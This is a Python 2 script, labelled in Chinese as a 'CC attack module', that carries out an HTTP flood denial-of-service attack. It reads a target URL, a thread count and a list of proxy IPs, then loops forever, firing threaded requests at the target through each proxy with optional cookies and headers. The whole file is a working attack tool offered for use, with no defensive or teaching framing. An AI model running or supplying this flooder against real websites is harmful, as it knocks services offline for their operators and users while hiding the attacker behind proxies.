# -*- coding: utf-8 -*-
"""cc攻击模块"""
import optparse
import threading
import urllib2
import socket
from random import choice
"""定义请求头"""

thread_list = []
"""线程锁"""
mutex = threading.Lock()
def main():
    parser = optparse.OptionParser(u"usage%prog -u '<url 攻击地址>' -t '<启动攻击的线程数>' -f '<可用的代理IP文件>' [--cookie '<cookie参数>'] [--header '<请求头参数>']")
    parser.add_option('-u',dest="URL",type="string",help=u"要攻击的地址")
    parser.add_option('-t',dest='threadnum',type='string',help=u'启动的线程数')
    parser.add_option('-f',dest='filename',type='string',help=u'可用的代理IP文件')
    parser.add_option('--cookie',dest='cookie',type='string',help=u'添加cookie参数')
    parser.add_option('--headers',dest='headers',type='string',help=u'添加请求头参数')
    (options, args) = parser.parse_args()
    if options.URL != None and options.threadnum != None and options.filename != None:
        if options.cookie != None:
            cookie = options.cookie
        else :
            cookie = ''
        if options.headers != None:
            headers = options.headers
        else :
            headers = ''
        URL = options.URL
        threadnum = options.threadnum
        filename = options.filename
        try:
            f = open(filename, 'r')
            lines = f.readlines()
        except Exception, e:
            print u"%s不存在，请检查输入的文件名" % (filename)
            exit(0)
        finally:
            f.close
        while  True:
            thread_list=[]
            for ip in lines:
                t = threading.Thread(target=cc,args=(URL,ip,cookie,headers))
                thread_list.append(t)
            for t in thread_list:
                if len(threading.enumerate()) < threadnum:
                    t.start()
            for t in thread_list:
                t.join()

def cc(url,ip,cookie,headers):
    socket.setdefaulttimeout(5)
    if headers == '':
        User_Agent = 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0'
        header = {}
        header['User-Agent'] = User_Agent
    else:
        User_Agent = headers
        header = {}
        header['User-Agent'] = User_Agent
    req = urllib2.Request(url,headers=header)
    mutex.acquire()
    print "使用代理IP----------->%s" % (ip)
    print "正在cc攻击----------->%s" % (url)
    mutex.release()
    proxy_s=urllib2.ProxyHandler({'http': ip})
    opener=urllib2.build_opener(proxy_s)
    opener.addheaders.append(('Cookie',cookie))
    urllib2.install_opener(opener)
    try:
        content=urllib2.urlopen(req).read()
    except Exception,e:
        print "使用代理IP----------->%s" % (ip)
        print "正在cc攻击----------->%s" % (url)
        print e
if __name__ == '__main__':
    main()
